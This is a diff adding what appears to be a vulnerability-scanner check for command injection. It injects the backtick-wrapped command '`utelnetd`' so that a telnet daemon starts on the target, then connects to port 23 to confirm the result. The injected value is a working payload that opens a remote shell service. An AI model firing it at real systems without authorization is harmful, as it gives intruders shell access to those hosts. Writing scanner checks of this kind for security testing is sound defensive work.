@@ -1,0 +1,41 @@
+var name = "Command Injection - telnetd";
+var description = "Checks for command injection by attempting to start telnetd on the target";
+var detail = "The host appears to be vulnerable to command injection, this was confirmed by sending a request to start telnetd and then successfully connecting to the host.";
+var severity = "High";
+var confidence = "Certain";
+var type = "Active";
+var injection_value = "`utelnetd`";
+var requestMarkers = [0,0];
+var responseMarkers = [0,0];
+var output = "";
+
+function test(){
+    try{
+        importPackage(java.net);
+        importPackage(java.io);
+        var target = url.substring(url.indexOf("://")+3,url.indexOf(":",url.indexOf("://")+3));
+        var sock = new Socket(target,23);
+
+        if(sock.isConnected() == true){
+            var br = new BufferedReader(new InputStreamReader(sock.getInputStream()));
+            output += String(br.readLine()) + " <br>";
+            output += String(br.readLine()) + " <br>";
+            output += String(br.readLine()) + " <br>";
+            output += String(br.readLine()) + " <br>";
+            detail += "The server responded with the following: <br>" + output;
+
+            sock.close();
+            return true;
+        }
+
+        return false;
+    }
+    catch(err)
+    {
+        result = false;
+        output += "\n" + name + " - Error: " + err;
+    }
+}
+
+result = test();
+output = "";
